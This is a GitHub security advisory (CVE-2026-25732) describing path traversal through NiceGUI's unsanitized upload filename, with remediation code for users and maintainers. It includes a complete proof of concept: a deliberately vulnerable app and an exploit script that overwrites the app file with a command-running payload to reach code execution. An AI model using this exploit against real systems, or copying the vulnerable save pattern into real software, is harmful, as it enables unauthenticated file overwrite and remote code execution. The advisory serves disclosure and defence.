# [H] NiceGUI's Path Traversal via Unsanitized FileUpload.name Enables Arbitrary File Write

## Summary
Severity: High
Advisory: GHSA-9ffm-fxg3-xrhh
CVE: CVE-2026-25732
CWE: CWE-22, CWE-601
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N (CVSS_V3)
Published: 2026-02-05
Source: https://github.com/advisories/GHSA-9ffm-fxg3-xrhh
Type: github-advisory

## Affected
- PyPI: `nicegui` — affected >=0 <3.7.0

## Details
### Summary
NiceGUI's `FileUpload.name` property exposes client-supplied filename metadata without sanitization, enabling path traversal when developers use the pattern `UPLOAD_DIR / file.name`. Malicious filenames containing `../` sequences allow attackers to write files outside intended directories, with potential for remote code execution through application file overwrites in vulnerable deployment patterns. This design creates a prevalent security footgun affecting applications following common community patterns.

**Note**: Exploitation requires application code incorporating `file.name` into filesystem paths without sanitization. Applications using fixed paths, generated filenames, or explicit sanitization are not affected.

### Details
**Vulnerable Component**: `nicegui/elements/upload_files.py` ([upload_files.py#L79-L82](https://github.com/zauberzeug/nicegui/blob/main/nicegui/elements/upload_files.py#L79-L82) and [upload_files.py#L110-L115](https://github.com/zauberzeug/nicegui/blob/main/nicegui/elements/upload_files.py#L110-L115))

**Affected Methods**: `SmallFileUpload.save()`and `LargeFileUpload.save()`

```py
async def save(self, path: str | Path) -> None:
    target = Path(path)
    target.parent.mkdir(parents=True, exist_ok=True)
    await run.io_bound(target.write_bytes, self._data)
```

**Root Cause**: The `save()` method performs no validation on the provided path parameter. It accepts:
- Relative paths with `../` sequences
- Absolute paths
- Any file system location writable by the process

When developers use `e.file.name` (controlled by the attacker) in constructing save paths, directory traversal occurs:
```py
save_path = UPLOAD_DIR / e.file.name  # e.file.name = "../app.py"
await e.file.save(save_path)           # Writes outside UPLOAD_DIR
```

### PoC
- Terminal 1 (App)
```bash
cd /tmp && mkdir -p evilgui && cd evilgui
python3 -m venv evilgui && source evilgui/bin/activate
pip install nicegui

cat > vulnerable_app.py << 'EOF'
from nicegui import ui
from pathlib import Path

UPLOAD_DIR = Path('./uploads')
UPLOAD_DIR.mkdir(exist_ok=True)

@ui.page('/')
def index():
    async def handle_upload(e):
        save_path = UPLOAD_DIR / e.file.name
        await e.file.save(save_path)
        ui.notify(f'File saved: {e.file.name}')
    
    ui.upload(on_upload=handle_upload, auto_upload=True)

ui.run(port=8080, reload=False)
EOF

python3 vulnerable_app.py &
```

- Terminal 2 (Exploit)
```bash
cat > exploit.py << 'EOF'
import requests, re, time

s = requests.Session()
s.get('http://localhost:8080')
time.sleep(2)

html = s.get('http://localhost:8080').text
match = re.search(r'/_nicegui/client/([^/]+)/upload/(\d+)', html)
upload_url = f'http://localhost:8080/_nicegui/client/{match[1]}/upload/{match[2]}'

payload = '''from nicegui import ui
import subprocess
@ui.page("/")
def index():
    ui.label(subprocess.check_output(["id"], text=True))
ui.run(port=8080, reload=False)
'''

s.post(upload_url, files={'file': ('../vulnerable_app.py', payload, 'text/x-python')})
EOF

python3 exploit.py
```
- Restart the application to execute the injected code:
```
pkill -f vulnerable_app && python3 vulnerable_app.py
```
- Observe http://localhost:8080

### Impact
**Affected Applications**: All NiceGUI applications using `ui.upload()` where developers save files with `e.file.save()` and include user-controlled filenames (e.g., `e.file.name`) in the path.

**Attack Capabilities**:
- Write files to any location writable by the application process
- Overwrite Python application files to achieve remote code execution upon restart
- Overwrite configuration files to alter application behavior
- Write SSH keys, systemd units, or cron jobs for persistent access
- Deny service by corrupting critical files

**Exploitability**: Trivially exploitable without authentication. Attackers simply upload a file with a malicious filename like `../../../app.py` to escape the upload directory. The vulnerability is prevalent in production applications as developers naturally use `e.file.name` directly, following patterns shown in community examples.

### Remediation
#### For Users
```py
async def handle_upload(e):
    safe_name = Path(e.file.name).name # Strip directory components!
    await e.file.save(UPLOAD_DIR / safe_name)
```

#### For Maintainers
```py
async def save(self, path: str | Path, *, base_dir: Path | None = None) -> None:
    target = Path(path).resolve()
    
    if base_dir is not None:
        base_dir = base_dir.resolve()
        if not target.is_relative_to(base_dir):
            raise ValueError(
                f"Path '{target}' escapes base directory '{base_dir}'"
            )
    
    target.parent.mkdir(parents=True, exist_ok=True)
    await run.io_bound(target.write_bytes, self._data)
````

## References
- https://github.com/zauberzeug/nicegui/security/advisories/GHSA-9ffm-fxg3-xrhh
- https://nvd.nist.gov/vuln/detail/CVE-2026-25732
- https://github.com/pypa/advisory-database/tree/main/vulns/nicegui/PYSEC-2026-95.yaml
- https://github.com/zauberzeug/nicegui
- https://github.com/zauberzeug/nicegui/blob/main/nicegui/elements/upload_files.py#L110-L115
- https://github.com/zauberzeug/nicegui/blob/main/nicegui/elements/upload_files.py#L79-L82
